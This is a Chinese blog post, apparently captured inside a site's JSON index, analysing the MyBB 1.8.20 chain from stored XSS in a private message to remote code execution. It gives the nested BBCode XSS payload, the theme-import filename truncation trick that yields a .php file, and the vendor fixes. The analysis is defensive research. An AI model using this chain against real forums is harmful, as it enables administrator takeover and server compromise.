halab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png)\n\n&nbsp;\n\n访问该文件\n\n[![65](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png)\n\nPhpinfo执行成功\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n## **0x03 漏洞分析时发现的问题**\n* * *\n\n### **1. sql_mode默认值问题**\n\n笔者在尝试构造与复现rce漏洞时，当构造34字符长度文件名，以便通过mysql最大长度截断机制截断时，出现的如下问题：\n\n[![66](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png)\n\nData too long~\n\n笔者使用的是Wamp环境，在查看安装的mysql配置时，发现默认sql_mode为STRICT_ALL_TABLES，如下图：\n\n[![67](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png)\n\nSTRICT_ALL_TABLES：\n\n对所有引擎的表都启用严格模式。(STRICT_TRANS_TABLES只对支持事务的表启用严格模式)。\n\n在严格模式下，一旦任何操作的数据产生问题，都会终止当前的操作。对于启用STRICT_ALL_TABLES选项的非事务引擎来说，这时数据可能停留在一个未知的状态。这可能不是所有非事务引擎愿意看到的一种情况，因此需要非常小心这个选项可能带来的潜在影响。\n\n在严格模式下，超长的字符串，不能被截断入库，因此这里可能会影响到该漏洞的利用\n\n###\n\n### 2.urldecode的必要性\n\n在xss漏洞中，漏洞作者原文有一段描述如下\n\n [![68](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png)\n\n漏洞作者在他的文章中这样描述\n\n“通常，由于正则表达式过滤器可以防止此类攻击，因此无法在其他bbcodes中注入bbcodes。但是，对于呈现[video] bbcodes的回调方法会在应嵌入的视频的URL上调用urldecode（）。视频URL被urldecoded，这将允许绕过正则表达式保护并通过URL编码注入。”\n\n从作者的描述来看，正是因为此处的urldecode存在，导致被url编码后的payload可以绕过正则防护，从而造成注入。根据作者描述，构建的流程如下：\n\n1.Payload-&gt;正则过滤器-&gt;检测不通过-&gt;失败\n\n2.url编码后的payload-&gt;正则过滤器-&gt;检测通过-&gt;urldecode-&gt;还原为明文payload-&gt;注入成功\n\n但是在我实际分析中，发现根本不需要对payload进行URL编码，正如上文我构造的pyaload，无需编码仍可触发漏洞。而且，也没有在urldecode执行前，发现正则过滤器\n\n### 3.RCE漏洞的入口\n\n关于RCE漏洞的入口，作者原文描述如下:\n\n [![69](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png)\n\n在此处，作者多次提到create与choose the filename字眼，一度让我认为漏洞存在于创建与修改Theme处，如下图\n\n [![70](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png)\n\n或是修改Template Name处，如下图\n\n [![71](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png)\n\n在尝试寻找rce入口时，发现一处有意思的地方，当修改templates为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css时\n\n [![72](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png)\n\n保存后，程序会将.css截断，并提示后缀问题，如下图\n\n [![73](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png)\n\n在跟踪此处代码时发现，在修改template name时，程序是会检查文件名长度并截断的，控制template name长度为30字符，如下图\n\n [![74](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png)\n\n这里可以印证，漏洞入口并不在修改名字和创建template处，经过后来的分析与寻找，才找到上文中真正的入口点，也就是Import a Theme处。但是从这个过程可见，mybb对文件名长度还是有一定限制的，只是防护的有疏漏，忘记检查导入的xml结构中的name字段长度。\n\n&nbsp;\n\n## **0x04 漏洞修复**\n* * *\n\n### **xss漏洞**\n\n针对xss漏洞，使用encode_url方法替换原来的htmlspecialchars_uni，如下图\n\n [![75](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png)\n\n回顾上文，在漏洞利用中，id中的内容为嵌套的url bbcod代码\n\n [![76](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png)\n\n当id被url编码后，之后在通过正则解析url bbcod代码时，该处被编码后的内容就不会被正则匹配到，从而防止嵌套解析造成xss漏洞\n\n### RCE漏洞\n\n针对rce漏洞，使用my_substr方法限制name长度为30字符，如下图\n\n [![77](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png)\n","source":"_posts/MyBB-RCE.md","raw":"---\ntitle: MyBB 1.8.20 从存储型XSS到RCE漏洞深度分析\ndate: 2019-09-4 19:26:54\ntags: web漏洞分析\ncategories: 技术\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n<div align=\"center\">{% asset_img 1.jpg%}</div>\n\nMyBB是国际上非常优秀的免费论坛软件，最大的特色是简单但是功能却出奇的强大，支持多国语言，可以分别设置前台后台的语言。\n\nMyBB作为一个开源项目，拥有活跃的社区环境，项目的管理,发展由社区志愿者支持。用户量广泛，在github上的项目拥有609 个star，79个releases。\n\nMyBB &lt;= 1.8.20存在一处从存储的XSS到RCE组合利用漏洞，攻击者可以先通过xss获得管理员权限，再通过rce达到远程代码执行。这套利用流程不仅隐蔽而且利用难度低，只要私信给mybb管理员发出一条包含payload的消息即可。\n\n<!--more-->\n\n该漏洞由RIPS 团队安全研究人员Simon Scannell发现并纰漏。但截止目前，并未公布利用poc\n\n我们试图从Simon Scannell简单的漏洞披露中深入分析该漏洞，并尝试还原出poc\n\n首先分析下mybb xss漏洞\n\n&nbsp;\n\n## **0x01 XSS漏洞**\n* * *\n\n此漏洞为mybb对BBCode的错误解析而造成的\n\n首先了解下BBCode:\n\nBCode是Bulletin Board Code的缩写，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所表示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。\n\n下图举个简单的例子：\n\n[![0](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png)\n\n在BBcode中给关键词加链接可以用下面的代码：\n\n[url=[https://www.xiongbenxiongbenxiong.com/1.html](https://www.xiongbenxiongbenxiong.com/1.html)]熊本熊本熊[/url]\n\n然而，BBcode只是一种标记语言，并没有一个共同的标准。各个BBS、论坛、Blog等网络应用程序可能会有自己独创的BBcode。在实际场景中，不同的程序会在后台使用不同的方式将BBcode解析成html来进行页面渲染\n\n接下来看下mybb程序对BBCode的解析流程\n\n举一个例子，使用BBcode格式分别插入的一条视频链接与一条url链接\n\n[![1](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png)\n\nMybb程序会对BBcode进行解析，以便转化为浏览器可识别的html语言\n\nMybb首先会对video链接进行解析（注意：这与video和url的排列顺序无关，在程序的后台，会首先处理video，后处理url）\n\n经过video解析器解析后的格式如下\n\n[![2](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png)\n\n接着mybb对BBCode格式的url进行解析，经过url解析器解析后的格式如下\n\n[![3](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png)\n\n此时，mybb以将BBcode语言解析成为html语言，浏览器渲染页面，显示嵌入的video与超链接中的url\n\n如果，我们将两个BBCode格式的语句进行嵌套呢？\n\n像如下图这样的形式\n\n[![4](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png)\n\n按照我们的推测，会进行如下的解析：\n\n首先，解析video\n\n[![5](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png)\n\n解析之后的格式如上图\n\n然后，解析url，也就是下图红框处的结构\n\n[![6](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png)\n\n解析之后的结果如下图\n\n[![7](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png)\n\n[![8](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png)\n\n注意上图红框这里，src中的值，被href引入的双引号闭合，而onmusemove成功逃逸出来，意味着alert会在鼠标移动时，alert将会被执行\n\n事实上，以上的流程，在mybb中是否成立。正式因为上文猜测中的嵌套解析，造成了此次xss漏洞\n\n接下来跟下代码\n\n首先，我们给管理员（admin）账号发一条如下图bbcode语言的私信\n\n[![9](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png)\n\n这条私信会原封不动的被写入数据库中\n\n[![10](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png)\n\n当管理员查看私信时，这条message会被从数据库中取出，并解析为html语言进行渲染\n\n[![11](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png)\n\n程序调用private.php执行上述操作，跟进private.php\n\n[![12](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png)\n\n在997行处，程序将留言从数据库中取出，并赋值$pm\n\n[![13](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png)\n\n在11789行处，将$pm传入build_postbit方法\n\n[![14](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png)\n\n跟入build_postbit方法\n\n[![15](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png)\n\n在该方法774行处，将message传入parse_message,这里的message即为我们构造的BBCode语句\n\n跟入parse_message方法\n\n[![16](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png)\n\n在parse_message方法中201行处，调用parse_mycode对$message进行处理\n\n跟入parse_mycod方法\n\n[![17](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png)\n\n如上图，第一个红框处，会对bbcode中的video结构进行解析，而第二个红框处，会对url,email等结构进行解析。正因为这里的解析的先后顺序，决定了构造poc时的嵌套顺序\n\n首先来看video解析\n\n[![18](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png)\n\n这里使用了preg_replace_callback，对匹配到的内容使用mycode_parse_video_callback回调进行替换\n\n[![19](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png)\n\n跟入mycode_parse_video_callback\n\n[![20](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png)\n\n可见mycode_parse_video_callback将$matches[1], $matches[2]传入mycode_parse_video方法\n\n跟入mycode_parse_video方法\n\n [![21](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png)\n\n如下图，首先使用parse_url对传入的url($matches[2])进行解析\n\n [![22](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png)\n\n解析后的parsed_url值如下图\n\n [![23](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png)\n\n接着，将$parsed_url['fragment']赋值与$ fragment\n\n [![24](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png)\n\n随后，进入switch语句，根据不同视频来源，分情况解析。我们这里构造的是youtbe来源，进入该分支\n\n [![25](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png)\n\n在下图中，将$ fragment中的!v=置空，赋值与$id\n\n[![26](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png)\n\n此时id值为test[url=onmousemove='alert(1337)']\n\n [![27](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png)\n\n随后，由于担心xss攻击，程序在这里对$id进行html特殊字符转义处理，如下图\n\n[![28](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png)\n\n[![29](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png)\n\n接着，从templates中取出对应video的模板，如下图$templates get方法\n\n[![30](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png)\n\n根据get方法，看下取出模板的形式\n\n[![31](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png)\n\n上图为最终生成html的模板，此处的$id即为上文中case分支中赋值的$id\n\n最终，将$id值填充的模板中，结果如下图\n\n[![32](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png)\n\n回到preg_replace_callback处，$message替换后的结果如下图\n\n[![33](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png)\n\n此时$message=&lt;iframe width=\"560\" height=\"315\" src=\"//www.youtube.com/embed/test[url=onmousemove='alert(1337)']\" frameborder=\"0\" allowfullscreen&gt;&lt;/iframe&gt;[/url]\n\nVideo的解析到此结束了，此时html语句，是不是和上文流程中猜测的形式一样呢？\n\n&nbsp;\n\n接下来，仍然使用preg_replace_callback对url进行替换\n\n[![34](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png)\n\n如下图可见，使用#\\[url=((?!javascript)[a-z]+?://)([^\n\n\"&lt;]+?)\\](.+?)\\[/url\\]#si正则进行匹配，使用\n\nmycode_parse_url_callback1回调对$message进行替换\n\n[![35](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png)\n\n此处的处理与上文中的video极其相似，这里就不重复说明了\n\n在url解析结束后，messgae值如下图\n\n[![36](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png)\n\n可见，如上文流程分析一致，href中引入的双引号，将src闭合了，onmousemove得以逃逸\n\n最终，xss产生\n\n[![37](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png)\n\n[![38](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png)\n\n[![39](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png)\n\n利用给管理员私信的这个功能，通过xss漏洞，可以获取管理员cookie，从而获得后台权限\n\n接下来分析下rce漏洞\n\n&nbsp;\n\n## **0x02 RCE漏洞**\n* * *\n\nMybb后台提供导入theme功能\n\n[![40](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png)\n\n可以选择本地theme进行导入，上传的theme格式许为xml格式，形式如下\n\n[![41](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png)\n\n这里的导入的xml文件存储了该theme下所有包含的css文件，下面展示其中两个片段\n\n[![42](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png)\n\n[![43](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png)\n\n简单来说，相当于是把这个theme里包含的所有css都存储到xml一个结构里\n\n在上传xml格式的theme时，程序后台会解析该xml，如下图代码\n\n[![44](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png)\n\n随后，将解析的xml树中的内容，例如css名称，内容、id等写入数据库\n\n[![45](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png)\n\n上图即为解析上传的xml格式的theme，将解析出的css的信息入库的操作\n\n[![46](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png)\n\n入库后，数据库中内容如上图\n\n在解析xml内的css数据的name时，后台程序会校验css的后缀是否合法\n\n[![47](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png)\n\n可见，程序要求xml结构中，css文件后缀应为.css。但其校验方式仅仅检测css名称后四位是否为.css\n\n当我们构造css数据时，可以使得css文件名为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css,在css文件内容处插入payload，如下图\n\n[![48](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png)\n\n在xml解析后，$stylesheet['attributes']['name']的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，成功绕过检测\n\n当进行入库操作时，如下图代码\n\n[![49](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png)\n\n此时将要插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，由于mysql默认字段长度为30字符，而我们的name长度为34字符，所以，.css会被截断，最终插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php。\n\n与此同时，aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，会插入到stylesheet字段中，我们构造的payload随同aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，一同写入数据库。\n\n[![50](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png)\n\n程序在执行xml数据从解析到入库的操作的同时，也会在本地生成对应的文件，如下图\n\n[![51](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png)\n\n这里生成文件名仍是.css后缀。原因很好理解：这里生成的文件名由解析上传的xml文件中的css name值决定的，如下图\n\n[![52](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png)\n\n因此后缀为.css\n\n&nbsp;\n\n接下来在后台页面中，查看我们刚刚导入的theme\n\n[![53](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png)\n\n可以看到我们grq themes里的css列表中，后缀已经变为php\n\n这是为什么呢？原因很简单，因为此处展示的内容，是从数据库中查询得到，此时数据库内容如下图\n\n[![54](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png)\n\n数据库由于30字符最大长度的截断，已经把入库的文件名后的.css截断了，此时数据库中name的后缀变为php\n\n这时，点击Stylesheets in grq 列表中的aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入编辑页面\n\n[![55](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png)\n\n[![56](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png)\n\n再次查看后台文件夹，可见生成了一个.php后缀文件，如下图\n\n[![57](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png)\n\n这里的原理也很简单。点击编辑css文件时，程序会从数据库中读取该文件的name以及内容，\n\n并判断在指定目录中是否存在，若不存在，则用数据库中取出的name为文件名，生成文件，并将数据库中取出的内容写入该文件中\n\n由于此时库中的name为aaaaaaaaaaaaaaaaaaaaaaaaaa.php，所以在指定位置生成了aaaaaaaaaaaaaaaaaaaaaaaaaa.php文件\n\n下面跟下php文件生成的流程与代码\n\n在点击aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入其编辑页面这个操作\n\n[![58](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png)\n\n&nbsp;\n\n此时发送请求如下\n\n[![59](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png)\n\n后台代码执行如下：\n\n首先进入\n\n\\admin\\modules\\style\\themes.php\n\n[![60](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png)\n\n此时的action为edit_stylesheet，进入上图分支\n\n接着从数据库中查询该条数据，执行的sql语句如下\n\n[![61](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png)\n\n[![62](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png)\n\n查询结果如上图\n\n&nbsp;\n\n最后将库中内容写入文件，文件名即为库中name字段，文件内容即为库中stylesheet字段\n\n[![63](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png)\n\n如上图，构造的payload被写入aaaaaaaaaaaaaaaaaaaaaaaaaa.php\n\n&nbsp;\n\n打开aaaaaaaaaaaaaaaaaaaaaaaaaa.php，可见payload成功写入\n\n[![64](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png)\n\n&nbsp;\n\n访问该文件\n\n[![65](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png)\n\nPhpinfo执行成功\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n## **0x03 漏洞分析时发现的问题**\n* * *\n\n### **1. sql_mode默认值问题**\n\n笔者在尝试构造与复现rce漏洞时，当构造34字符长度文件名，以便通过mysql最大长度截断机制截断时，出现的如下问题：\n\n[![66](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png)\n\nData too long~\n\n笔者使用的是Wamp环境，在查看安装的mysql配置时，发现默认sql_mode为STRICT_ALL_TABLES，如下图：\n\n[![67](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png)\n\nSTRICT_ALL_TABLES：\n\n对所有引擎的表都启用严格模式。(STRICT_TRANS_TABLES只对支持事务的表启用严格模式)。\n\n在严格模式下，一旦任何操作的数据产生问题，都会终止当前的操作。对于启用STRICT_ALL_TABLES选项的非事务引擎来说，这时数据可能停留在一个未知的状态。这可能不是所有非事务引擎愿意看到的一种情况，因此需要非常小心这个选项可能带来的潜在影响。\n\n在严格模式下，超长的字符串，不能被截断入库，因此这里可能会影响到该漏洞的利用\n\n###\n\n### 2.urldecode的必要性\n\n在xss漏洞中，漏洞作者原文有一段描述如下\n\n [![68](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png)\n\n漏洞作者在他的文章中这样描述\n\n“通常，由于正则表达式过滤器可以防止此类攻击，因此无法在其他bbcodes中注入bbcodes。但是，对于呈现[video] bbcodes的回调方法会在应嵌入的视频的URL上调用urldecode（）。视频URL被urldecoded，这将允许绕过正则表达式保护并通过URL编码注入。”\n\n从作者的描述来看，正是因为此处的urldecode存在，导致被url编码后的payload可以绕过正则防护，从而造成注入。根据作者描述，构建的流程如下：\n\n1.Payload-&gt;正则过滤器-&gt;检测不通过-&gt;失败\n\n2.url编码后的payload-&gt;正则过滤器-&gt;检测通过-&gt;urldecode-&gt;还原为明文payload-&gt;注入成功\n\n但是在我实际分析中，发现根本不需要对payload进行URL编码，正如上文我构造的pyaload，无需编码仍可触发漏洞。而且，也没有在urldecode执行前，发现正则过滤器\n\n### 